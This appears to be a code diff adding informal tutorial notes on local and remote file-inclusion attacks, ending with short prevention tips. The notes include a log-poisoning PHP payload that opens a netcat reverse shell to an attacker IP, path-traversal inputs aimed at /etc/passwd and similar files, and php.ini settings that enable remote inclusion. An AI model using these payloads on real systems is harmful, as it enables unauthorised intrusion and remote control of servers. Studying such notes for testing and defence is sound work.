@@ -1,0 +1,69 @@
+LOCAL FILE INCLUSION
+	>>Allows an attacker to read any file on the same server.Access file outside www directory
+	>>Modify user-agent with the following code <?passthru("nc -a /bin/sh 10.2.3.18 8001");?>
+	>>Try to inject code into readable files
+         Ex: /proc/self/environ
+             /var/log/auth.log
+             /var/log/apache2/access.log
+
+ssh random@10.2.3.19
+If it get stored in log file ,you can exploit it
+The file get stored to log file and you just have to upload the file.Now go to browser and just press enter.You receive a connection
+
+REMOTE FILE INCLUSIOM
+	>>Similar to local file inclusion.But allows an attacker to read any file from any server.Execute php files from other servers on the current server.Store php files on other servers at .txt
+	>>nano /etc/php5/cgi/php.ini
+
+That's the location where php configuration is stored
+          allow_url_fopen=On
+          allow_url_include=On
+/etc/init.d/apache2 restart
+
+
+#Impact of File Inclusion
+	>>Code Execution on server
+	>>Code Execution on client side
+	>>DOS Attack
+	>>Information disclosure
+
+#Possible Parameters
+file	document	folder		root	path	pg		style	pdf		template	php_path	doc
+
+dest	redirect	uri		path	continue	url		window		next	data	reference	site
+html	val		validate	domain		callback	return		page	feed	host	port	to
+out		view	sir		show	navigation		open
+
+
+LFI vs RFI
+LOCAL FILE INCLUSION
+	>>If target web server is reside on linux platform server path will be /var/www/html
+					any.com/index.php?file=trump.jpg
+
+system configuration file in root directory       /.bashrc
+
+any.com/index.php?file=../../../etc/passwd
+
+
+REMOTE FILE INCLUSION
+any.com/index.php?file=http://remoteweb.com/trump.jpg
+
+
+Hint :What if target ssserver will be windows based then
+               C:\boot.ini
+
+LFI Hunting Methodology
+ You have to find a paramter that include some local file 
+ Search for parameters like file,folder  try with /etc/passwd
+
+RFI Hunting methodology
+ Find any parameter that will load content of any website
+
+TOOLS used for file inclusion  
+	>>LFISuite
+
+How to prevent RFI
+	>>Disable allow_url_fopen
+	>>Disable allow_url_include
+
+Prevent local file inclusion 
+     Use static file inclusion
